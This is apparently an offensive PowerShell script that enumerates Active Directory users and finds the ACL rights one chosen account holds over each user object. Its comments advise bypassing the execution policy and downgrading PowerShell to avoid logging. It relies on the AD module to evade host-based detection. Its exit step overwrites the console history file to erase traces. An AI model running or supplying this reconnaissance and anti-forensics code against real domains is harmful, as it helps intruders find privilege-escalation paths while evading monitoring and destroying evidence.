# MakeSure to Bypass ExecutionPolicy on Powershell to run Scripts.
#Get-ExecutionPolicy
#Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass


Powershell -Version 2 #Try Downgrading if Possible to avoid LOGS.
#This Script is the head, its quick and enumerates ACLS via a loop for all UsersINADomain, it utilizes the normal AD-Module so its a bit stealthier.

Write-Host "        v   |\           v "
Write-Host "            | \               v "
Write-Host "            |* \   v               boom " 
Write-Host "       _    |__*\                _\ ___ /  / " 
Write-Host "        \-___|___i_->*  --o     *o* / \ \ / / " 
Write-Host "         \ o * o /               |  /-\  | / " 
Write-Host "        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  "
Write-Host  "   Wish we could S4veTh3eW0rld.... (I know i will.)  "


try{ 
    Import-Module ActiveDirectory -ErrorAction Stop #Needed for all new Scripts, only use ActiveDirectory Module to bypass Host-Based IDS and Monitoring Services.
} catch {
    Write-Host "MODULES NOT AVAILABLE, EXITING..."
    Exit
}

Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > 29dhj2.txt
#POWERSHELL IS BEAUTIFUL.
$location = Get-Location

$usr = Read-Host -Prompt "Input User to Enumerate ACL for User"
$tmpofuser = Get-ADUser -Identity $usr -Properties SID
$sid = $tmpofuser.SID.Value
$domain = Get-ADDomain
$domain = $domain.NetBiosName

foreach($line in [System.IO.File]::ReadLines("$location\29dhj2.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match "$domain\\$usr"}} 
Write-Host "Finished Enumerating, CHECK For each USR"

[int] $continueornot = Read-Host "Press 1 to RESTART script, ELSE: Auto-Exit"
if ($continueornot -eq 1){
    &ACLEnumeration.ps1
} else {
    sc C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt ""
    Exit
}



